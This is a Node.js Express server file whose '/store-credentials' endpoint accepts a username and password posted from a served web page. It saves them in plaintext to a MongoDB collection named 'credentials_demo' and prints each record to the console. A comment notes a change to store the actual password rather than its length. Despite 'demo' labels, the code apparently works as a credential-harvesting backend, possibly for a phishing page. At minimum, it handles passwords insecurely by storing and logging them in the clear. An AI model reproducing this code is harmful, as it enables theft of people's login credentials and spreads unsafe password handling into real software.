require("dotenv").config();

const express = require("express");
const { MongoClient } = require("mongodb");
const path = require("path");

const app = express();
app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname, "public")));
app.use("/src", express.static(path.join(__dirname, "src")));

// MongoDB setup
const client = new MongoClient(process.env.MONGODB_URI);

let collection;

async function connectDB() {
  try {
    await client.connect();
    const db = client.db("dkwin_data");
    collection = db.collection("credentials_demo");
    console.log("MongoDB connected (demo mode)");
  } catch (err) {
    console.error("MongoDB connection failed:", err.message);
  }
}

// 🔴 IMPORTANT: call the function
connectDB();

// API endpoint
app.post("/store-credentials", async (req, res) => {
  const { type, username, password } = req.body;

  if (!collection) {
    return res.status(500).json({ error: "Database not ready" });
  }

  const record = {
    type,
    username,
    password, // Store the actual password instead of just its length
    demo: true,
    timestamp: new Date()
  };

  await collection.insertOne(record);
  console.log("Simulated data stored:", record);

  res.json({ message: "Demo data stored" });
});

// Main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});